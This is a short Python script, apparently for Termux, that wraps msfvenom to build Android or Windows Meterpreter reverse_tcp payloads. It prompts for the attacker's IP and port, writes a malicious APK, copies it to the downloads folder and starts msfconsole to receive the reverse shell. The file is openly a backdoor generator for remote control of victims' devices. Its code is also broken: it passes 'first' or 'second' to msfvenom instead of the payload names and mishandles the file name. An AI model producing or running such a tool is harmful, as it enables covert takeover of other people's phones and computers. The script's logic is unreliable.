import os

first = "android/meterpreter/reverse_tcp"
second = "windows/meterpreter/reverse_tcp"
print("available payloads:", first)
print("available payloads:", second)
print("___For selecting type: first or second___")
Android_payload = input("Enter the payload - first or second: ",)
os.system("ifconfig")
print("select your inet-'ip address'.")
lhost = input("Enter your ip address - ",)
lport = input("Enter your port number - ",)
apk_name = input("Enter apk name - ",)
msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name+".apk"

def payload():
    if Android_payload == "first":
        os.system(msfvenom_sentence)
        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
        os.system("msfconsole")
    elif Android_payload == "second":
        os.system(msfvenom_sentence)
        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
        os.system("msfconsole")
    else:
        print("Wrong syntax")
payload()

